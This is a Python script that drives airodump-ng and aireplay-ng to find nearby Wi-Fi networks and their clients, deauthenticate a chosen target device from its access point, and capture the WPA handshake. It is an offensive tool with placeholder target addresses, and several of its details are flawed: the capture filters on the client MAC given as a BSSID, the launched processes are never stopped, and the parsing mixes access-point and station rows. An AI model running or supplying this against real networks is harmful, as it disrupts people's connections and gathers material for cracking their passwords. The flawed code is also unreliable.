import subprocess
import time


def get_nearby_networks_and_stations(interface):
    cmd = ["airodump-ng", "--write", "output", interface]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    try:
        while True:
            line = process.stdout.readline().decode("utf-8")
            if not line:
                break

            if "BSSID" in line:
                break
    except KeyboardInterrupt:
        process.terminate()

    process.terminate()

    with open("output-01.csv", "r") as f:
        lines = f.readlines()

    networks = {}
    for line in lines[1:]:
        parts = line.strip().split(",")
        bssid = parts[0]
        station = parts[5]
        if bssid and station != "Station MAC":
            networks.setdefault(bssid, []).append(station)

    return networks

def deauth_and_capture(interface, target_mac, ap_mac, capture_duration=10):
    try:
        # Start deauthentication attack
        deauth_command = ["aireplay-ng", "--deauth", "15", "-a", ap_mac, "-c", target_mac, interface]
        deauth_process = subprocess.Popen(deauth_command)
        
        # Start capturing packets
        capture_command = ["airodump-ng", "--bssid", target_mac, "-w", "Utils/database", interface]
        capture_process = subprocess.Popen(capture_command)
        
        # Wait for the capture duration
        time.sleep(capture_duration)

        return {"status": "success", "message": "Deauthentication attack and packet capture complete"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    interface = "wlan0"  # Replace with your actual Wi-Fi interface name
    target_mac = "target_mac"  # Replace with your target MAC address
    ap_mac = "ap_mac"  # Replace with your AP MAC address
    capture_duration = 10  # Adjust capture duration as needed

    # Step 1: Get nearby networks and stations
    nearby_networks_and_stations = get_nearby_networks_and_stations(interface)
    print("Nearby Networks and Stations:", nearby_networks_and_stations)

    # Step 2: Deauth and capture handshake
    result = deauth_and_capture(interface, target_mac, ap_mac, capture_duration)
    print("Deauth and Capture Result:", result)